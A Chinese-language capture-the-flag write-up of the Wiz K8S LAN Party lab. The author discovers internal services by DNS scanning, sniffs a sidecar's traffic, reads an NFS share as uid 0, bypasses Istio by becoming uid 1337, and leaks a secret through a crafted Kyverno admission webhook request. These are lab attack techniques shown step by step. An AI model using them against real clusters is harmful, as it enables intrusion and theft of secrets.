---
title: WIZ K8S LAN Party WP
---

<center><h1>WIZ K8S LAN Party Writeup</h1><h2>本文作者：feng</h2><br><br></center>

---

## Introduction

笔者这篇文章也是在各种 hint、gpt、博客文章的帮助下才写出，并且参考了一个大哥的 wp，如果没有 hint 和 gpt 的话想完整的把这五个挑战做出来确实需要蛮大的知识面了。

## RECON

> You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.
>
> As a warmup, utilize [DNS scanning](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue) to uncover hidden internal services and obtain the flag. We have "loaded your machine with [dnscan](https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e) to ease this process for further challenges.
>
> Make sure you scan the correct subnet. You can get a hint of what the correct subnet is by looking at the Kubernetes API server address in the machine’s environment variables.
>
> The cluster subnet is 10.100.0.0/16

根据题目信息里的知识联想起来了隐约还记得的知识，就是可以用一种域名形式去访问 svc。先扫描：

```bash
dnscan -subnet 10.100.*.*
35031 / 65536 [-------------------------------------------------------------->_____________________________________________________] 53.45% 973 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local
```

直接curl获取flag：

```bash
curl getflag-service.k8s-lan-party.svc.cluster.local
wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}
```


## FINDING NEIGHBOURS

> The sidecar container shares the same lifecycle, resources, and **network namespace** as the main container.
>
> The machine is preloaded with [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html) and can be used to sniff the sidecar's network traffic

根据提示就是当前 pod 中还有一个 sidecar 容器，这个容器会共享网络的 namespace。

使用 netstat 命令来显示网络连接、路由表、接口统计等信息

```shell
netstat -neo
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      Timer
tcp        0      0 192.168.8.159:47392     10.100.171.123:80       TIME_WAIT   0          0          timewait (38.08/0/0)
tcp        0      0 192.168.8.159:41246     10.100.171.123:80       TIME_WAIT   0          0          timewait (18.02/0/0)
tcp        0      0 192.168.8.159:43734     10.100.171.123:80       TIME_WAIT   0          0          timewait (53.12/0/0)
tcp        0      0 192.168.8.159:41258     10.100.171.123:80       TIME_WAIT   0          0          timewait (23.04/0/0)
tcp        0      0 192.168.8.159:43732     10.100.171.123:80       TIME_WAIT   0          0          timewait (48.10/0/0)
tcp        0      0 192.168.8.159:45850     10.100.171.123:80       TIME_WAIT   0          0          timewait (13.01/0/0)
tcp        0      0 192.168.8.159:45746     10.100.171.123:80       TIME_WAIT   0          0          timewait (2.99/0/0)
tcp        0      0 192.168.8.159:47406     10.100.171.123:80       TIME_WAIT   0          0          timewait (43.09/0/0)
tcp        0      0 192.168.8.159:35228     10.100.171.123:80       TIME_WAIT   0          0          timewait (28.05/0/0)
tcp        0      0 192.168.8.159:35234     10.100.171.123:80       TIME_WAIT   0          0          timewait (33.06/0/0)
tcp        0      0 192.168.8.159:45844     10.100.171.123:80       TIME_WAIT   0          0          timewait (8.00/0/0)
tcp        0      0 192.168.8.159:47760     10.100.171.123:80       TIME_WAIT   0          0          timewait (58.13/0/0)
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
```

发现会向 10.100.171.123:80 发起 tcp 连接，但是找不到相关的进程。

```shell
ss -tnp
State           Recv-Q           Send-Q                     Local Address:Port                       Peer Address:Port           Process
```

因此猜测这个连接是由 sidecar 容器发起的，捕获这个 tcp 流量等待一会后即可获得 flag：

```shell
tcpdump host 10.100.171.123 -w tcp.pcap

cat tcp.pcap
ÔÃ²¡Ï¹ûeJJJ>ø@ßdféÑ    E<¦L@ÖHÀ{·
                                 P¡¡ô úðU´
ýÏ¹ûeíJJféÑ     >ø@ßE<@|
d«{À¨
    ÉdWò¡¡õ þU´
GÜÔýÏ¹ûe÷BB>ø@ßdféÑ    E4¦M@ÖOÀ{·
                                 P¡¡õÉdWóöM
ýGÜÔÏ¹ûe:>ø@ßdféÑ      E
¦N@ÕxÀ{·
        P¡¡õÉdWóö#
ýGÜÔPOST / HTTP/1.1
Host: reporting-service
User-Agent: curl/7.64.0
Accept: */*
Content-Length: 63
Content-Type: application/x-www-form-urlencoded

wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}Ï¹ûe.BBféÑ
```


## DATA LEAKAGE

> You might find it useful to look at the [documentaion](https://github.com/sahlberg/libnfs) for nfs-cat and nfs-ls.
>
> The following NFS parameters should be used in your connection string: version, uid and gid


根据提示是用了 nfs，具体是用 pv 和 pvc（相关知识有些忘了），查看一下挂载：

```bash
mount|grep -i "nfs"
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.4.189,local_lock=none,addr=192.168.124.98)
```

可以发现 flag 但是读取不了，可能就要用 `nfs-cat` 了。

```bash
ls /efs/
flag.txt
cat /efs/flag.txt
cat: /efs/flag.txt: Permission denied
```

但是正常连似乎连不上：

```bash
nfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/
Failed to mount nfs share : mount_cb: nfs_service failed
```


根据提示要加上一些参数，估计就是 nfs 版本啥的，问一下 gpt 说可能是 3 或者 4，uid 和 gid 估计就是 0 了。

```bash
nfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version=4&uid=0&gid=0
[1] 26
[2] 27
player@wiz-k8s-lan-party:/efs$ ----------  1     1     1           73 flag.txt

nfs-cat 'nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&uid=0&gid=0'
wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}
```


## BYPASSING BOUNDARIES

> Try examining Istio's [IPTables rules](https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables).
>
> Try executing "cat /etc/passwd | grep 1337", to find the user that can bypass the Istio's IPTables rules

```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: istio-get-flag
  namespace: k8s-lan-party
spec:
  action: DENY
  selector:
    matchLabels:
      app: "{flag-pod-name}"
  rules:
  - from:
    - source:
        namespaces: ["k8s-lan-party"]
    to:
    - operation:
        methods: ["POST", "GET"]
```

istio 是一个服务网络，查了一下有很多的功能，例如负载均衡、流量管理等等。上面的 policy 就限制了来自`k8s-lan-party`namespace流量对 flag pod 的 post 和 get 请求被拒绝。

仍然检测一下服务，发现了`istio-protected-pod-service.k8s-lan-party.svc.cluster.local`，请求会被拒绝

```bash
dnscan -subnet 10.100.*.*
57436 / 65536 [----------------------------------------------------------------------------------------------------->______________] 87.64% 994 p/s10.100.224.159 istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
65394 / 65536 [------------------------------------------------------------------------------------------------------------------->] 99.78% 994 p/s10.100.224.159 -> istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
65536 / 65536 [-------------------------------------------------------------------------------------------------------------------] 100.00% 997 p/s

```

```shell
curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local
RBAC: access denied
```

猜测请求这个服务就可以获得 flag，因此要绕过了。

根据 hint1，给了 ipables 的规则：

```
[ssh node]$ sudo nsenter -t ${PROXY_PID} -n iptables-save
# Generated by iptables-save v1.6.1 on Fri May 29 05:00:49 2020
*nat
:PREROUTING ACCEPT [12921:775260]
:INPUT ACCEPT [12924:775440]
:OUTPUT ACCEPT [9987:716510]
:POSTROUTING ACCEPT [10019:718430]
:ISTIO_INBOUND - [0:0]
:ISTIO_IN_REDIRECT - [0:0]
:ISTIO_OUTPUT - [0:0]
:ISTIO_REDIRECT - [0:0]
-A PREROUTING -p tcp -j ISTIO_INBOUND
-A OUTPUT -p tcp -j ISTIO_OUTPUT
-A ISTIO_INBOUND -p tcp -m tcp --dport 22 -j RETURN
-A ISTIO_INBOUND -p tcp -m tcp --dport 15090 -j RETURN
-A ISTIO_INBOUND -p tcp -m tcp --dport 15020 -j RETURN
-A ISTIO_INBOUND -p tcp -j ISTIO_IN_REDIRECT
-A ISTIO_IN_REDIRECT -p tcp -j REDIRECT --to-ports 15006
-A ISTIO_OUTPUT -s 127.0.0.6/32 -o lo -j RETURN
-A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -m owner --uid-owner 1337 -j ISTIO_IN_REDIRECT
-A ISTIO_OUTPUT -o lo -m owner ! --uid-owner 1337 -j RETURN
-A ISTIO_OUTPUT -m owner --uid-owner 1337 -j RETURN
-A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -m owner --gid-owner 1337 -j ISTIO_IN_REDIRECT
-A ISTIO_OUTPUT -o lo -m owner ! --gid-owner 1337 -j RETURN
-A ISTIO_OUTPUT -m owner --gid-owner 1337 -j RETURN
-A ISTIO_OUTPUT -d 127.0.0.1/32 -j RETURN
-A ISTIO_OUTPUT -j ISTIO_REDIRECT
-A ISTIO_REDIRECT -p tcp -j REDIRECT --to-ports 15001
COMMIT
```

没看太懂 iptables 规则，问了一下 gpt 大概是下面这些：

```

-A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -m owner --uid-owner 1337 -j ISTIO_IN_REDIRECT
-A ISTIO_OUTPUT -o lo -m owner ! --uid-owner 1337 -j RETURN
-A ISTIO_OUTPUT -m owner --uid-owner 1337 -j RETURN
-A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -m owner --gid-owner 1337 -j ISTIO_IN_REDIRECT
-A ISTIO_OUTPUT -o lo -m owner ! --gid-owner 1337 -j RETURN
-A ISTIO_OUTPUT -m owner --gid-owner 1337 -j RETURN
```

如果目的地址不是本地回环且输出接口是 lo，uid 是 1337 和 gid 是 1337 就重定向到 ISTIO_IN_REDIRECT，但是下面的 `-A ISTIO_OUTPUT -m owner --uid-owner 1337 -j RETURN` 和 `-A ISTIO_OUTPUT -m owner --gid-owner 1337 -j RETURN` 又针对 uid 是 1337 和 gid 是 1337 的用户直接放行不重定向。

因为不太懂 iptables 所以不确定是不是这样理解，但确实 1337 可以绕过：[Consider protecting envoy from being bypassed by an app · Issue #4286 · istio/istio](https://github.com/istio/istio/issues/4286)

issue 也提到确实需要容器中有 root 权限。

```bash
cat /etc/passwd|grep -i "1337"
istio:x:1337:1337::/home/istio:/bin/sh

su istio

curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local
wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}
```

## LATERAL MOVEMENT

> Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the [administrative](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request) services.
>
> Need a hand crafting AdmissionReview requests? Checkout https://github.com/anderseknert/kube-review.
>
> This exercise consists of three ingredients: kyverno's hostname (which can be found via dnscan), the relevant HTTP path (which can be found in Kyverno's source code) and the AdmissionsReview request.

```yaml
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: apply-flag-to-env
  namespace: sensitive-ns
spec:
  rules:
    - name: inject-env-vars
      match:
        resources:
          kinds:
            - Pod
      mutate:
        patchStrategicMerge:
          spec:
            containers:
              - name: "*"
                env:
                  - name: FLAG
                    value: "{flag}"
```



题目的描述有点抽象啊，先问 GPT：

```
这段话描述的是一种在Kubernetes环境中，通过利用Pod的变更机制（mutation）来泄露敏感信息的场景。这里的“外国政权（foreign regime）”比喻为对Pod进行变更的外部实体或过程，而“滥用官僚机制（abuse its bureaucracy）”指的是通过利用这个变更过程的漏洞或设计缺陷来达到不良目的。具体到这个上下文，意味着攻击者可以通过这种变更机制（比如Kubernetes的准入控制器或其他自动化配置）来注入或泄露信息。

在Kubernetes CTF（Capture The Flag）挑战中，这通常意味着参与者可以探索和利用Kubernetes集群的配置或策略中的漏洞。例如，如果一个Pod在创建或更新时被自动注入了敏感环境变量（如上面的策略所示），攻击者可能会设法触发这种变更来泄露这些敏感信息。

在这种情况下，攻击者可能会利用这些自动化的行为（即“官僚机制”），如自动注入敏感信息到Pod的环境变量中，来获取这些信息。这就是为什么保护管理服务不被未授权访问或滥用变得非常重要，因为它们可能会被用来泄露敏感信息或进行其他恶意行为。
```

再看 policy 的话，kyverno 会自动为 sensitive-ns namespace 里的 pod 注入 env flag。

扫描 svc：

```bash
dnscan -subnet 10.100.*.*
22107 / 65536 [--------------------------------------->____________________________________________________________________________] 33.73% 989 p/s10.100.86.210 kyverno-cleanup-controller.kyverno.svc.cluster.local.
32179 / 65536 [-------------------------------------------------------->___________________________________________________________] 49.10% 988 p/s10.100.126.98 kyverno-svc-metrics.kyverno.svc.cluster.local.
40483 / 65536 [----------------------------------------------------------------------->____________________________________________] 61.77% 988 p/s10.100.158.213 kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
43846 / 65536 [----------------------------------------------------------------------------->______________________________________] 66.90% 988 p/s10.100.171.174 kyverno-background-controller-metrics.kyverno.svc.cluster.local.
55702 / 65536 [-------------------------------------------------------------------------------------------------->_________________] 84.99% 988 p/s10.100.217.223 kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
59247 / 65536 [-------------------------------------------------------------------------------------------------------->___________] 90.40% 987 p/s10.100.232.19 kyverno-svc.kyverno.svc.cluster.local.
65363 / 65536 [------------------------------------------------------------------------------------------------------------------->] 99.74% 987 p/s10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
```

大概查一下，似乎 `kyverno-svc.kyverno.svc.cluster.local` 是 Kyverno 的主要服务入口点。

hint 又给了 admission webhook 的请求方式，用 post 请求，设置  `Content-Type: application/json`  并对  `admission.k8s.io`  API  组中的  `AdmissionReview`  对象进行序列化。

`AdmissionReview` 对象可以用 [anderseknert/kube-review: Create Kubernetes AdmissionReview requests from Kubernetes resource manifests](https://github.com/anderseknert/kube-review) 来产生，hint 中还说要考虑 path ，直接 GPT：

> Kyverno 处理 admission webhook 请求的 HTTP 路径通常是 `/validate` 用于验证（validation）webhooks，和 `/mutate` 用于变更（mutation）webhooks。这意味着 Kyverno 在 Kubernetes 集群中注册了这些路径来接收和处理来自 Kubernetes API 服务器的 webhook 调用。当 Kubernetes API 服务器需要对资源进行验证或变更时，它会向 Kyverno 发送请求到这些路径。

我们的想法是创建一个 sensitive-ns namespace 的 pod ，因此应该是 `/mutate` 了。

但是直接 curl 会报错：

```bash
curl kyverno-svc.kyverno.svc.cluster.local
upstream connect error or disconnect/reset before headers. reset reason: connection timeout
```

一开始以为是 path 错了，后来查到了一个 issue ，原来是 https：[[Bug] InternalError, error: Internal error occurred: failed calling webhook "mutate.kyverno.svc-fail" · Issue #7378 · kyverno/kyverno](https://github.com/kyverno/kyverno/issues/7378)

因此准备就绪，开始攻击。

首先创建`AdmissionReview`：

```yaml
cat pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: curl-flag
  namespace: sensitive-ns
spec:
  containers:
  - name: curl-container
    image: curlimages/curl

```

```bash
./kube-review create pod.yaml
{
    "kind": "AdmissionReview",
    "apiVersion": "admission.k8s.io/v1",
    "request": {
        "uid": "4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3",
        "kind": {
            "group": "",
            "version": "v1",
            "kind": "Pod"
        },
        "resource": {
            "group": "",
            "version": "v1",
            "resource": "pods"
        },
        "requestKind": {
            "group": "",
            "version": "v1",
            "kind": "Pod"
        },
        "requestResource": {
            "group": "",
            "version": "v1",
            "resource": "pods"
        },
        "name": "curl-flag",
        "namespace": "sensitive-ns",
        "operation": "CREATE",
        "userInfo": {
            "username": "kube-review",
            "uid": "ca06bc76-7f37-4fcf-af63-5a07fb0c4204"
        },
        "object": {
            "kind": "Pod",
            "apiVersion": "v1",
            "metadata": {
                "name": "curl-flag",
                "namespace": "sensitive-ns",
                "creationTimestamp": null
            },
            "spec": {
                "containers": [
                    {
                        "name": "curl-container",
                        "image": "curlimages/curl",
                        "resources": {}
                    }
                ]
            },
            "status": {}
        },
        "oldObject": null,
        "dryRun": true,
        "options": {
            "kind": "CreateOptions",
            "apiVersion": "meta.k8s.io/v1"
        }
    }
}

```

然后发起请求：

```bash
curl -k -X POST \
https://kyverno-svc.kyverno.svc.cluster.local:443/mutate \
  -H 'content-type: application/json' \
  -d '{
    "kind": "AdmissionReview",
    "apiVersion": "admission.k8s.io/v1",
    "request": {
        "uid": "4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3",
        "kind": {
            "group": "",
            "version": "v1",
            "kind": "Pod"
        },
        "resource": {
            "group": "",
            "version": "v1",
            "resource": "pods"
        },
        "requestKind": {
            "group": "",
            "version": "v1",
            "kind": "Pod"
        },
        "requestResource": {
            "group": "",
            "version": "v1",
            "resource": "pods"
        },
        "name": "curl-flag",
        "namespace": "sensitive-ns",
        "operation": "CREATE",
        "userInfo": {
            "username": "kube-review",
            "uid": "ca06bc76-7f37-4fcf-af63-5a07fb0c4204"
        },
        "object": {
            "kind": "Pod",
            "apiVersion": "v1",
            "metadata": {
                "name": "curl-flag",
                "namespace": "sensitive-ns",
                "creationTimestamp": null
            },
            "spec": {
                "containers": [
                    {
                        "name": "curl-container",
                        "image": "curlimages/curl",
                        "resources": {}
                    }
                ]
            },
            "status": {}
        },
        "oldObject": null,
        "dryRun": true,
        "options": {
            "kind": "CreateOptions",
            "apiVersion": "meta.k8s.io/v1"
        }
    }
}'

{"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1","request":{"uid":"4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"requestKind":{"group":"","version":"v1","kind":"Pod"},"requestResource":{"group":"","version":"v1","resource":"pods"},"name":"curl-flag","namespace":"sensitive-ns","operation":"CREATE","userInfo":{"username":"kube-review","uid":"ca06bc76-7f37-4fcf-af63-5a07fb0c4204"},"object":{"kind":"Pod","apiVersion":"v1","metadata":{"name":"curl-flag","namespace":"sensitive-ns","creationTimestamp":null},"spec":{"containers":[{"name":"curl-container","image":"curlimages/curl","resources":{}}]},"status":{}},"oldObject":null,"dryRun":true,"options":{"kind":"CreateOptions","apiVersion":"meta.k8s.io/v1"}},"response":{"uid":"4cff4c58-75ba-4c4b-97e8-a972f3fc3ff3","allowed":true,"patch":"W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d","patchType":"JSONPatch"}}

```

base64 解码获得 flag

```
[{"op":"add","path":"/spec/containers/0/env","value":[{"name":"FLAG","value":"wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}"}]}, {"path":"/metadata/annotations","op":"add","value":{"policies.kyverno.io/last-applied-patches":"inject-env-vars.apply-flag-to-env.kyverno.io: added /spec/containers/0/env\n"}}])j×!O*^	HãOj×!
```

## References

[Kubernetes Internal Service Discovery · The Grey Corner](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue)

[Sidecar Containers | Kubernetes](https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/)

[sahlberg/libnfs: NFS client library](https://github.com/sahlberg/libnfs)

[Consider protecting envoy from being bypassed by an app · Issue #4286 · istio/istio](https://github.com/istio/istio/issues/4286)

[Dynamic Admission Control | Kubernetes](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request)

[anderseknert/kube-review: Create Kubernetes AdmissionReview requests from Kubernetes resource manifests](https://github.com/anderseknert/kube-review)

[K8S Lan Party WP](https://mp.weixin.qq.com/s/TsPp4Us2h193lwzsNUgu2A)

[[Bug] InternalError, error: Internal error occurred: failed calling webhook "mutate.kyverno.svc-fail" · Issue #7378 · kyverno/kyverno](https://github.com/kyverno/kyverno/issues/7378)


<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2024 年 3 月 21 日"
    }
  }
</script>